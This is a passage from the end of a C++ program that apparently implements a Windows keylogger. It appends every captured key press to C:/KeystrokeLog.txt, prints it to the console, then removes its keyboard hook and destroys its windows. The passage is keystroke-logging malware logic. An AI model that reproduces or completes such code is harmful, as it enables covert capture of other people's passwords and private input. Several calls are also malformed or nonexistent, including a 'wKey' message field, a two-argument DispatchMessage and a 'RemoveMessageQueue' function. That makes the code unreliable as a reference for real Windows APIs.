            // Handle key press
            if (msg.wKey > 0) {
                // Log the key press
                // For example, write to a file
                ofstream logFile;
                string path = "C:/KeystrokeLog.txt";
                logFile.open(path, ios::app);
                logFile << (char)msg.wKey;
                logFile.close();
                cout << "Key pressed: " << (char)msg.wKey << endl;
            }
        }
        TranslateMessage(&msg);
        DispatchMessage(hwndQueue, &msg);
    }

    // Clean up
    UnhookWindowsHook(kbrdhook);
    RemoveMessageQueue(hwndQueue);
    DestroyWindow(hwndQueue);
    DestroyWindow(hwndMain);

    return 0;
}
